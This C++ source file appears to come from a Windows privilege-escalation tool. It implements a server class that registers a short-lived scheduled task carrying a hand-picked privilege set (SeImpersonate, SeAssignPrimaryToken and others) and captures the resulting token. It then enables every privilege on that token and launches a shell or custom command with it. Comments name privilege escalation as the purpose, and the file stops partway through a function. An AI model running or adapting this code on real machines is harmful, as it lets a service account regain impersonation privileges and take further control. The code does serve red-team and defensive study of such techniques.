
#include <Windows.h>
#include <iostream>
#include <strsafe.h>
#include <lmcons.h>
#include <taskschd.h>
#include <comdef.h>
#include "Server.h"
#include "Common.h"

#pragma comment(lib, "taskschd.lib")
#pragma warning( disable : 6248 ) // We want to create unprotected events on purpose so disable this warning 

DWORD WINAPI DummyThread(LPVOID lpParam);
BOOL EnableAllPrivileges(HANDLE hToken, BOOL bVerbose, LPDWORD lpdwPrivCount);

Server::Server()
{
}

Server::~Server()
{
	if (m_pwszCurrentExecutable)
		free(m_pwszCurrentExecutable);

	if (m_pwszCurrentUsername)
		free(m_pwszCurrentUsername);

	if (m_hMainThread)
		CloseHandle(m_hMainThread);

	if (m_hDummyThread)
		CloseHandle(m_hDummyThread);

	if (m_hTaskStartedEvent)
		CloseHandle(m_hTaskStartedEvent);
	
	if (m_hTaskCompletedEvent)
		CloseHandle(m_hTaskCompletedEvent);
}

void Server::SetVerbose(BOOL bVerbose)
{
	m_bVerbose = bVerbose;
}

void Server::SetInteract(BOOL bInteract)
{
	m_bInteract = bInteract;
}

void Server::SetExtendedPrivileges(BOOL bExtendedPrivilegeSet)
{
	m_bExtendedPrivilegeSet = bExtendedPrivilegeSet;
}

void Server::SetTimeout(DWORD dwTimeout)
{
	m_dwTimeout = dwTimeout;
}

void Server::SetCustomCommand(LPWSTR pwszCustomCommand)
{
	m_pwszCustomCommand = pwszCustomCommand;
}

BOOL Server::Run()
{
	// 0) Initialize some variables
	if (!InitiliazeClass())
		return FALSE;

	if (m_bVerbose)
		wprintf(L"[*] Current user is: '%ls'\n", m_pwszCurrentUsername);

	if (m_bVerbose)
		wprintf(L"[*] Current executable is: '%ls'\n", m_pwszCurrentExecutable);

	// 1) Create dummy thread in suspended state
	if (!StartDummyThread())
		return FALSE;

	// 2) Create event to know when the task is started 
	if (!CreateCustomEvent(EventType::EVT_TASK_STARTED))
	{
		TerminateDummyThread();
		return FALSE;
	}

	// 3) Create event to know when the task is completed
	if (!CreateCustomEvent(EventType::EVT_TASK_COMPLETED))
	{
		TerminateDummyThread();
		return FALSE;
	}

	// 4) Create scheduled task 
	LPWSTR pwszArguments = NULL;

	pwszArguments = (LPWSTR)malloc(32 * sizeof(WCHAR));
	if (!pwszArguments)
		return FALSE;

	StringCchPrintf(pwszArguments, 32, L"-t %i", m_dwDummyThreadId);

	if (!CreateScheduledTask(m_pwszTaskName, m_pwszCurrentExecutable, pwszArguments, m_pwszCurrentUsername))
	{
		wprintf(L"[-] Failed to create custom scheduled task.\n");
		TerminateDummyThread();
		free(pwszArguments);
		return FALSE;
	}

	free(pwszArguments);

	// 5) Start scheduled task 
	if (!StartScheduledTask(m_pwszTaskName))
	{
		wprintf(L"[-] Failed to start scheduled task.\n");
		TerminateDummyThread();
		DeleteScheduledTask(m_pwszTaskName);
		return FALSE;
	}

	wprintf(L"[+] Successfully created scheduled task.\n");

	// 6) Sleep 1s and delete task
	Sleep(1000);

	if (!(DeleteScheduledTask(m_pwszTaskName)))
	{
		wprintf(L"[!] Failed to delete scheduled task.\n");
	}

	if (m_bVerbose)
		wprintf(L"[*] Successfully deleted scheduled task.\n");

	// 7) Wait for the task process to start 
	if (!WaitForEvent(EventType::EVT_TASK_STARTED))
	{
		wprintf(L"[-] Couldn't detect task's process start.\n");
		TerminateDummyThread();
		return FALSE;
	}

	// 8) Wait for the task to complete 
	if (!WaitForEvent(EventType::EVT_TASK_COMPLETED))
	{
		wprintf(L"[-] The task's process didn't complete as expected.\n");
		TerminateDummyThread();
		return FALSE;
	}

	if (m_bVerbose)
		wprintf(L"[+] The task's process completed successfully, resuming dummy thread.\n");

	// 9) Resume the dummy thread 
	if (ResumeWaitDummyThread() <= 0)
		return FALSE;

	if (m_bVerbose)
		wprintf(L"[+] The dummy thread completed successfully.\n");

	// 10) At this point we should have a new token with all privileges
	if (!CreateProcessWithNewToken())
		return FALSE;

	return TRUE;
}

BOOL Server::InitiliazeClass()
{
	BOOL bRes = FALSE;
	DWORD dwUsernameLen = UNLEN + 1;
	DWORD dwModuleNameLen = MAX_PATH + 1;
	HMODULE hModule = GetModuleHandle(NULL);

	m_pwszCurrentUsername = (LPWSTR)malloc(dwUsernameLen * sizeof(WCHAR));
	if (!m_pwszCurrentUsername)
		goto cleanup;

	//if (!GetUserName(m_pwszCurrentUsername, &dwUsernameLen))
	//{
	//	wprintf(L"[-] GetUserName() failed (Err: %d).\n", GetLastError());
	//	goto cleanup;
	//}

	if (!GetCurrentUsername(m_pwszCurrentUsername, &dwUsernameLen))
	{
		wprintf(L"[-] GetCurrentUsername() failed.\n");
		goto cleanup;
	}

	m_pwszCurrentExecutable = (LPWSTR)malloc(dwModuleNameLen * sizeof(WCHAR));
	if (!m_pwszCurrentExecutable)
		goto cleanup;

	if (!GetModuleFileName(hModule, m_pwszCurrentExecutable, dwModuleNameLen))
	{
		wprintf(L"[-] GetModuleFileName() failed (Err: %d).\n", GetLastError());
		goto cleanup;
	}

	bRes = TRUE;

cleanup:
	if (hModule)
		CloseHandle(hModule);

	return bRes;
}

BOOL Server::GetCurrentUsername(LPWSTR pwszCurrentUsername, LPDWORD pdwUsernameLen)
{
	BOOL bRes = FALSE;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	DWORD dwTokenInfoLen = 0;
	PTOKEN_USER pTokenUser = NULL;
	LPWSTR pwszDomain = NULL;
	DWORD dwDomainLen = 256;
	SID_NAME_USE snu;

	hProcess = GetCurrentProcess();

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		wprintf(L"[-] OpenThreadToken() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenInfoLen, &dwTokenInfoLen))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation() failed (Err: %d)\n", GetLastError());
			goto cleanup;
		}
	}

	pTokenUser = (PTOKEN_USER)malloc(dwTokenInfoLen);
	if (!pTokenUser)
		goto cleanup;

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenInfoLen, &dwTokenInfoLen))
	{
		wprintf(L"[-] GetTokenInformation() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	pwszDomain = (LPWSTR)malloc(dwDomainLen * sizeof(WCHAR));
	if (!pwszDomain)
		goto cleanup;

	if (!LookupAccountSid(NULL, pTokenUser->User.Sid, pwszCurrentUsername, pdwUsernameLen, pwszDomain, &dwDomainLen, &snu))
	{
		wprintf(L"[-] LookupAccountSid() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	bRes = TRUE;

cleanup:
	if (pwszDomain)
		free(pwszDomain);
	if (pTokenUser)
		free(pTokenUser);
	if (hToken)
		CloseHandle(hToken);

	return bRes;
}

BOOL Server::StartDummyThread()
{
	BOOL bRes = FALSE; 
	DWORD dwMainThreadId = 0;

	dwMainThreadId = GetCurrentThreadId();

	m_hMainThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwMainThreadId);
	if (!m_hMainThread)
	{
		wprintf(L"[-] OpenThread() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	DUMMYTHREADDATA params;
	ZeroMemory(&params, sizeof(DUMMYTHREADDATA));
	params.bVerbose = m_bVerbose;
	params.hTargetThread = &m_hMainThread;

	SECURITY_DESCRIPTOR sd;
	ZeroMemory(&sd, sizeof(SECURITY_DESCRIPTOR));
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	SECURITY_ATTRIBUTES sa;
	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = TRUE;
	
	m_hDummyThread = CreateThread(&sa, 0, &DummyThread, &params, CREATE_SUSPENDED, &m_dwDummyThreadId);
	if (!m_hDummyThread)
	{
		wprintf(L"[-] CreateThread() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	wprintf(L"[+] Started dummy thread with id %i\n", m_dwDummyThreadId);
	bRes = TRUE;

	fflush(stdout);

	return bRes;
}

BOOL Server::TerminateDummyThread()
{
	// It's not safe to use TerminateThread() because it forces the target thread to exit without
	// having a chance to clean things up. However, in our case, we call this function only if the
	// thread hasn't been started yet. We want to call this function only when an error occurs
	// between the time the thread is created in SUSPENDED state and the time it is resumed.
	// Therefore, we can use this function safely here (and ignore the warning from the compiler).
	#pragma warning(suppress: 6258)
	if (!TerminateThread(m_hDummyThread, -1))
	{
		wprintf(L"[-] TerminateThread() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL Server::WaitForEvent(EventType type)
{
	DWORD dwRet = 0;
	BOOL bRet = FALSE;
	PHANDLE hEvent = NULL;
	LPCWSTR pwszEventName = NULL;

	switch (type)
	{
	case EventType::EVT_TASK_STARTED:
		hEvent = &m_hTaskStartedEvent;
		pwszEventName = EVT_TASK_STARTED_NAME;
		break;
	case EventType::EVT_TASK_COMPLETED:
		hEvent = &m_hTaskCompletedEvent;
		pwszEventName = EVT_TASK_COMPLETED_NAME;
		break;
	default:
		return FALSE;
	}

	dwRet = WaitForSingleObject(*hEvent, m_dwTimeout);

	return dwRet == WAIT_OBJECT_0 ? TRUE : FALSE;
}

BOOL Server::CreateCustomEvent(EventType type)
{
	SECURITY_DESCRIPTOR sd;
	ZeroMemory(&sd, sizeof(SECURITY_DESCRIPTOR));
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	SECURITY_ATTRIBUTES sa;
	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = TRUE;

	PHANDLE phEvent;
	LPCWSTR pwszEventName;

	switch (type)
	{
	case EventType::EVT_TASK_STARTED:
		phEvent = &m_hTaskStartedEvent;
		pwszEventName = EVT_TASK_STARTED_NAME;
		break;
	case EventType::EVT_TASK_COMPLETED:
		phEvent = &m_hTaskCompletedEvent;
		pwszEventName = EVT_TASK_COMPLETED_NAME;
		break;
	default:
		wprintf(L"[-] CreateCustomEvent() failed. Unknown event type.\n");
		return FALSE;
	}

	*phEvent = CreateEvent(&sa, TRUE, FALSE, pwszEventName);
	if (!*phEvent)
	{
		wprintf(L"[-] CreateEvent() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

DWORD Server::ResumeWaitDummyThread()
{
	DWORD dwRes = -1;
	//HANDLE hThread = INVALID_HANDLE_VALUE; 
	DWORD dwRet = 0;

	dwRet = ResumeThread(m_hDummyThread);
	if (dwRet == (DWORD)-1)
	{
		wprintf(L"[-] ResumeThread() failed (Err: %d)\n", GetLastError());
		return dwRes;
	}

	dwRet = WaitForSingleObject(m_hDummyThread, m_dwTimeout);
	if (dwRet != WAIT_OBJECT_0)
	{
		wprintf(L"[-] Dummy thread failed or timed out.\n");
		return dwRes;
	}

	if (!GetExitCodeThread(m_hDummyThread, &dwRet))
	{
		wprintf(L"[-] GetExitCodeThread() failed.\n");
		return dwRes;
	}

	if (!dwRet)
	{
		wprintf(L"[-] Dummy thread failed.\n");
	}

	return dwRet;
}

BOOL Server::CreateProcessWithNewToken()
{
	BOOL bRet = FALSE;
	DWORD dwPrivCount = 0, dwCreationFlags = 0;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HANDLE hThreadToken = INVALID_HANDLE_VALUE;
	HANDLE hThreadTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwBufSize = 1024;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	LPWSTR pwszComspec = NULL, pwszSystemDir = NULL;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	pwszSystemDir = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	GetSystemDirectory(pwszSystemDir, MAX_PATH);

	hThread = GetCurrentThread();

	if (!OpenThreadToken(hThread, TOKEN_ALL_ACCESS, FALSE, &hThreadToken))
	{
		wprintf(L"[-] OpenThreadToken() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	if (m_bVerbose)
		wprintf(L"[*] OpenThreadToken() OK\n");

	// Keep getting INVALID_HANDLE_VALUE error here... :(
	//if (!IsPrivilegePresent(hThreadToken, SE_ASSIGNPRIMARYTOKEN_NAME))
	//{
	//	wprintf(L"[-] Check for SeAssignPrimaryTokenPrivilege failed.\n");
	//	goto cleanup;
	//}

	if (!EnableAllPrivileges(hThreadToken, m_bVerbose, &dwPrivCount))
		goto cleanup;

	wprintf(L"[+] Got new token! Privilege count: %d\n", dwPrivCount);

	if (!m_bInteract)
		dwCreationFlags = CREATE_NEW_CONSOLE;

	if (!DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hThreadTokenDup))
	{
		wprintf(L"[-] DuplicateTokenEx() failed (Err: %d)\n", GetLastError());
		goto cleanup;
	}

	if (m_pwszCustomCommand)
	{
		if (m_bVerbose)
			wprintf(L"[*] Using custom command: %ls\n", m_pwszCustomCommand);

		if (!CreateProcessAsUser(hThreadTokenDup, NULL, m_pwszCustomCommand, NULL, NULL, TRUE, dwCreationFlags, NULL, pwszSystemDir, &si, &pi))
		{
			wprintf(L"[-] CreateProcessAsUser() failed (Err: %d)\n", GetLastError());
			goto cleanup;
		}
	}
	else
	{
		pwszComspec = (LPWSTR)malloc(dwBufSize * sizeof(WCHAR));
		GetEnvironmentVariable(L"COMSPEC", pwszComspec, dwBufSize);
		
		if (!CreateProcessAsUser(hThreadTokenDup, pwszComspec, NULL, NULL, NULL, TRUE, dwCreationFlags, NULL, pwszSystemDir, &si, &pi))
		{
			wprintf(L"[-] CreateProcessAsUser() failed (Err: %d)\n", GetLastError());
			goto cleanup;
		}
	}

	wprintf(L"[+] CreateProcessAsUser() OK\n");

	fflush(stdout);

	if (m_bInteract)
		WaitForSingleObject(pi.hProcess, INFINITE);

	bRet = TRUE;

cleanup:
	if (hThreadToken)
		CloseHandle(hThreadToken);
	if (hThreadTokenDup)
		CloseHandle(hThreadTokenDup);
	if (hThread)
		CloseHandle(hThread);
	if (pwszComspec)
		free(pwszComspec);
	if (pwszSystemDir)
		free(pwszSystemDir);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bRet;
}

BOOL Server::IsPrivilegePresent(HANDLE hToken, LPCWSTR pwszPrivName)
{
	BOOL bRet = FALSE;
	LUID luid = { 0 };
	PRIVILEGE_SET privs;

	if (!LookupPrivilegeValue(NULL, pwszPrivName, &luid))
	{
		wprintf(L"[-] LookupPrivilegeValue() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_VALID_ATTRIBUTES;

	if (!PrivilegeCheck(hToken, &privs, &bRet))
	{
		wprintf(L"[-] PrivilegeCheck() failed (Err: %d)\n", GetLastError());
		return FALSE;
	}

	return bRet;
}

BOOL Server::CreateScheduledTask(LPCWSTR pwszTaskName, LPCWSTR pwszExecutable, LPCWSTR pwszArguments, LPCWSTR pwszUsername)
{
	BOOL bRes = FALSE;
	HRESULT hr = S_OK;
	ITaskService* pService = NULL;
	ITaskFolder* pRootFolder = NULL;
	ITaskDefinition* pTask = NULL;
	IPrincipal* pPrincipal = NULL;
	IPrincipal2* pPrincipal2 = NULL;
	IRegistrationInfo* pRegInfo = NULL;
	IActionCollection* pActionCollection = NULL;
	IAction* pAction = NULL;
	IExecAction* pExecAction = NULL;
	IRegisteredTask* pRegisteredTask = NULL;

	// According to the documentation, LOCAL SERVICE and NETWORK SERVICE have the same privilege set
	// by default:
	//   - SE_ASSIGNPRIMARYTOKEN_NAME(disabled)
	//	 - SE_AUDIT_NAME(disabled)
	//	 - SE_CHANGE_NOTIFY_NAME(enabled)
	//	 - SE_CREATE_GLOBAL_NAME(enabled)
	//	 - SE_IMPERSONATE_NAME(enabled)
	//	 - SE_INCREASE_QUOTA_NAME(disabled)
	//	 - SE_SHUTDOWN_NAME(disabled)
	//	 - SE_UNDOCK_NAME(disabled)
	//	 - Any privileges assigned to users and authenticated users
	// However, when trying to run a task as NETWORK SERVICE with the same privilege set as LOCAL
	// SERVICE, the Task Scheduler fails to create the process. Removing SE_SHUTDOWN_NAME,
	// SE_UNDOCK_NAME, SE_SYSTEMTIME_NAME and SE_TIME_ZONE_NAME from the set solves the issue. The 
	// documentation might be incorrect? For simplicity, we'll use the most restrictive set. These
	// four privileges don't really matter for privilege escalation anyway.
	// Links:
	//   - https://docs.microsoft.com/en-us/windows/win32/services/localservice-account
	//   - https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account

	LPCWSTR ppwszRequiredPrivileges[7] = { SE_ASSIGNPRIMARYTOKEN_NAME, SE_AUDIT_NAME, SE_CHANGE_NOTIFY_NAME, SE_CREATE_GLOBAL_NAME, SE_IMPERSONATE_NAME, SE_INCREASE_QUOTA_NAME, SE_INC_WORKING_SET_NAME }; // SE_SHUTDOWN_NAME, SE_UNDOCK_NAME, SE_SYSTEMTIME_NAME, SE_TIME_ZONE_NAME
	LPCWSTR ppwszRequiredPrivilegesExtended[11] = { SE_ASSIGNPRIMARYTOKEN_NAME, SE_AUDIT_NAME, SE_CHANGE_NOTIFY_NAME, SE_CREATE_GLOBAL_NAME, SE_IMPERSONATE_NAME, SE_INCREASE_QUOTA_NAME, SE_SHUTDOWN_NAME, SE_UNDOCK_NAME, SE_SYSTEMTIME_NAME, SE_INC_WORKING_SET_NAME, SE_TIME_ZONE_NAME };

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeEx() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		return bRes;
	}

	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeSecurity() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoCreateInstance(ITaskService) failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->Connect(VARIANT(), VARIANT(), VARIANT(), VARIANT());
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::Connect() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->GetFolder(BSTR(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::GetFolder() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	pRootFolder->DeleteTask(BSTR(pwszTaskName), 0);

	hr = pService->NewTask(0, &pTask);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::NewTask() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskDefinition::get_RegistrationInfo() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	//hr = pRegInfo->put_Author(BSTR(m_pwszCurrentUsername));
	//if (FAILED(hr))
	//{
	//	wprintf(L"[-] IRegistrationInfo::put_Author() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
	//	goto cleanup;
	//}

	hr = pTask->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskDefinition::get_Principal() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pPrincipal->put_UserId(BSTR(pwszUsername));
	if (FAILED(hr))
	{
		wprintf(L"[-] IPrincipal::put_Id() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
	if (FAILED(hr))
	{
		wprintf(L"[-] IPrincipal::put_LogonType() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}
	
	hr = pPrincipal->QueryInterface(IID_IPrincipal2, (void**)&pPrincipal2);
	if (FAILED(hr))
	{
		wprintf(L"[-] IPrincipal::QueryInterface() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	// By default, the task scheduler creates a new process with a token which contains the 
	// default set of privileges of the account without SeImpersonate. Therefore, we must add it
	// manually. But, doing so, it will reset the default set of privileges so, in the end, we must
	// add every single privilege manually.
	if (m_bExtendedPrivilegeSet)
	{
		for (int i = 0; i < (sizeof(ppwszRequiredPrivilegesExtended) / sizeof(*ppwszRequiredPrivilegesExtended)); i++)
		{
			hr = pPrincipal2->AddRequiredPrivilege(BSTR(ppwszRequiredPrivilegesExtended[i]));
			if (FAILED(hr))
			{
				wprintf(L"[-] IPrincipal2::AddRequiredPrivilege('%ls') failed (Err: 0x%x - %ls)\n", ppwszRequiredPrivilegesExtended[i], hr, _com_error(hr).ErrorMessage());
				goto cleanup;
			}
		}
	}
	else
	{
		for (int i = 0; i < (sizeof(ppwszRequiredPrivileges) / sizeof(*ppwszRequiredPrivileges)); i++)
		{
			hr = pPrincipal2->AddRequiredPrivilege(BSTR(ppwszRequiredPrivileges[i]));
			if (FAILED(hr))
			{
				wprintf(L"[-] IPrincipal2::AddRequiredPrivilege('%ls') failed (Err: 0x%x - %ls)\n", ppwszRequiredPrivileges[i], hr, _com_error(hr).ErrorMessage());
				goto cleanup;
			}
		}
	}

	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskDefinition::get_Actions() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}
	
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr))
	{
		wprintf(L"[-] IActionCollection::Create() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr))
	{
		wprintf(L"[-] IAction::QueryInterface() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pExecAction->put_Path(BSTR(pwszExecutable));
	if (FAILED(hr))
	{
		wprintf(L"[-] IExecAction::put_Path() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pExecAction->put_Arguments(BSTR(pwszArguments));
	if (FAILED(hr))
	{
		wprintf(L"[-] IExecAction::put_Arguments() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(pwszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &pRegisteredTask);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskFolder::RegisterTaskDefinition() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	bRes = TRUE;

cleanup:
	if (pExecAction)
		pExecAction->Release();
	if (pAction)
		pAction->Release();
	if (pActionCollection)
		pActionCollection->Release();
	if (pPrincipal2)
		pPrincipal2->Release();
	if (pPrincipal)
		pPrincipal->Release();
	if (pRegInfo)
		pRegInfo->Release();
	if (pRootFolder)
		pRootFolder->Release();
	if (pService)
		pService->Release();
	CoUninitialize();

	return bRes;
}

BOOL Server::StartScheduledTask(LPCWSTR pwszTaskName)
{
	BOOL bRes = FALSE;
	HRESULT hr = S_OK;
	ITaskService* pService = NULL;
	ITaskFolder* pRootFolder = NULL;
	IRegisteredTask* pRegisteredTask = NULL;
	IRunningTask* pRunningTask = NULL;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeEx() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		return bRes;
	}

	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeSecurity() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoCreateInstance(ITaskService) failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->Connect(VARIANT(), VARIANT(), VARIANT(), VARIANT());
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::Connect() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->GetFolder(BSTR(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::GetFolder() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pRootFolder->GetTask(BSTR(pwszTaskName), &pRegisteredTask);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskFolder::GetTask() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pRegisteredTask->Run(_variant_t(_bstr_t(L"")), &pRunningTask);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskRegisteredTask::Run() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	bRes = TRUE;

cleanup:
	if (pRunningTask)
		pRunningTask->Release();
	if (pRegisteredTask)
		pRegisteredTask->Release();
	if (pRootFolder)
		pRootFolder->Release();
	if (pService)
		pService->Release();
	CoUninitialize();

	return bRes;
}

BOOL Server::DeleteScheduledTask(LPCWSTR pwszTaskName)
{
	BOOL bRes = FALSE;
	HRESULT hr = S_OK;
	ITaskService* pService = NULL;
	ITaskFolder* pRootFolder = NULL;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeEx() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		return bRes;
	}

	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoInitializeSecurity() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		wprintf(L"[-] CoCreateInstance(ITaskService) failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->Connect(VARIANT(), VARIANT(), VARIANT(), VARIANT());
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::Connect() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pService->GetFolder(BSTR(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskService::GetFolder() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	hr = pRootFolder->DeleteTask(BSTR(pwszTaskName), 0);
	if (FAILED(hr))
	{
		wprintf(L"[-] ITaskFolder::DeleteTask() failed (Err: 0x%x - %ls)\n", hr, _com_error(hr).ErrorMessage());
		goto cleanup;
	}

	bRes = TRUE;

cleanup:
	if (pRootFolder)
		pRootFolder->Release();
	if (pService)
		pService->Release();
	CoUninitialize();

	return bRes;
}

BOOL EnableAllPrivileges(HANDLE hToken, BOOL bVerbose, LPDWORD lpdwPrivCount)
{
	BOOL bRet = FALSE;
	DWORD dwLastError = 0;
	DWORD dwTokenInfoLength = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LPVOID pInfo = NULL;

	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwTokenInfoLength))
	{
		dwLastError = GetLastError();
		if (dwLastError != ERROR_INSUFFICIENT_BUFFER) {
			wprintf(L"[-] GetTokenInformation failed (Err: %d)\n", dwLastError);
			goto cleanup;
		}
	}

	pInfo = LocalAlloc(LPTR, dwTokenInfoLength);
	if (!pInfo)
	{
		goto cleanup;
	}

	if (!GetTokenInformation(hToken, TokenPrivileges, pInfo, dwTokenInfoLength, &dwTokenInfoLength))
	{
